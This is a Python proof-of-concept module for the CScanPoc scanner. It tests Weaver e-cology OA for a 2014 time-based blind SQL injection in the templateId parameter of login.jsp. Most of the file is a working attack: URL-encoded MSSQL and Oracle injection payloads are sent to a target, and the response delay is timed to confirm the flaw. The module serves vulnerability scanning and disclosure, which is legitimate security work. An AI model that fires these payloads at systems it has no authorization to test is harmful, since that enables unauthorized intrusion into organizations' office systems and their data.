# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'weaver_0005'  # 平台漏洞编号，留空
    name = '泛微e-cology SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-08-27'  # 漏洞公布时间
    desc = '''
        作为协同管理软件行业的领军企业，泛微有业界优秀的协同管理软件产品。在企业级移动互联大潮下，泛微发布了全新的以“移动化 社交化 平台化 云端化”四化为核心的全一代产品系列，包括面向大中型企业的平台型产品e-cology、面向中小型企业的应用型产品e-office、面向小微型企业的云办公产品eteams，以及帮助企业对接移动互联的移动办公平台e-mobile和帮助快速对接微信、钉钉等平台的移动集成平台等等。
        泛微e-cology参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=074007'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9eec6427-0e6a-4efc-a7db-ba21d64ad6d3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://www.wooyun.org/bugs/wooyun-2010-074007
            hh = hackhttp.hackhttp()

            # MSSQL
            payload1 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20and%20(SELECT%20count(*)%20FROM%20sysusers%20AS%20sys1,%20sysusers%20assys2,%20sysusers%20as%20sys3,%20sysusers%20AS%20sys4,%20sysusers%20AS%20sys5,%20sysusers%20AS%20sys6,sysusers%20AS%20sys7,%20sysusers%20AS%20sys8)=1%20and%20'1'='1"
            payload2 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20and%201=1%20and%20'1'='1"
            t1 = time.time()
            code1, head1, res1, errcode1, _1 = hh.http(self.target + payload1)
            t2 = time.time()
            code2, head2, res2, errcode2, _2 = hh.http(self.target + payload2)
            t3 = time.time()
            if (t2 - t1 - t3 + t2 > 3):
                #security_hole(_1+' has injection(MSSQL)')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            # Oracle
            else:
                payload1 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=DBMS_PIPE.RECEIVE_MESSAGE(CHR(68)||CHR(102)||CHR(119)||CHR(86),5)%20AND%20'bcBY'='bcBY"
                payload2 = "/wui/theme/ecology7/page/login.jsp?templateId=1'%20AND%206120=6120%20AND%20'bcBY'='bcBY"
                t1 = time.time()
                code1, head1, res1, errcode1, _1 = hh.http(
                    self.target + payload1)
                t2 = time.time()
                code2, head2, res2, errcode2, _2 = hh.http(
                    self.target + payload2)
                t3 = time.time()
                if (t2 - t1 - t3 + t2 > 3):
                    #security_hole(_1+' has injection(Oracle)')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
